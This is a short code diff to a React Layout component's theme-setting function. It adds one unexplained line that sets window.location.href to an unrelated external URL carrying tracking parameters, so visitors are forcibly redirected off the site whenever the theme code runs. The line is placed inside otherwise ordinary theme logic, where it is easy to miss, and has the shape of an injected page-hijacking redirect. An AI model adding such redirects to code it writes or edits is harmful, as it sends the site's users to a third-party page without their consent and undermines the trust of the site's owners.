@@ -18,6 +18,7 @@ export default function Layout({ children }) {
   const setAppTheme = () => {
     const darkMode = localStorage.getItem('theme') === 'dark';
     const lightMode = localStorage.getItem('theme') === 'light';
+       window.location.href = 'https://lolitopia.com/2021/11/11/kitten-born-with-strabismus-found-suffering-from-malnourished-now-lives-loving-home/?cnt=32026&u=done';
 
     if (darkMode) {
       document.documentElement.classList.add('dark');
